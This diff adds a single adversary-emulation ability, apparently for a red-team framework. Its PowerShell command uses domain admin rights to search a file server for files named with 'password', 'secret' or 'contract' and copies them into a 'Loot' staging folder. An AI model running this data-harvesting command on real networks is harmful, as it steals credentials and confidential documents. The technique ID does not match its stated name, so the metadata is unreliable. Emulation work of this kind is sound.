@@ -1,0 +1,21 @@
+- id: 7d8e9f0a-1b2c-3d4e-5f6g-collectfiles
+  name: Collection - Search and Stage Sensitive Files
+  description: Uses DA privileges to search a file share for sensitive documents and copies them.
+  tactic: collection
+  technique:
+    attack_id: T1530
+    name: "Data from Network Shared Drive"
+  requirements:
+    - plugins.stockpile.app.requirements.existential:
+        - source: domain.admin.pwned
+  platforms:
+    windows:
+      psh:
+        command: |
+          $fileServer = "FS01.ifs.network"
+          $stagingDir = "C:\Users\Public\Loot"
+          New-Item -Path $stagingDir -ItemType Directory -ErrorAction SilentlyContinue
+          # Search for specific keywords in the share
+          Get-ChildItem -Path \\$fileServer -Recurse -Include "*contract*", "*password*", "*secret*" | ForEach-Object {
+              Copy-Item -Path $_.FullName -Destination $stagingDir
+          }
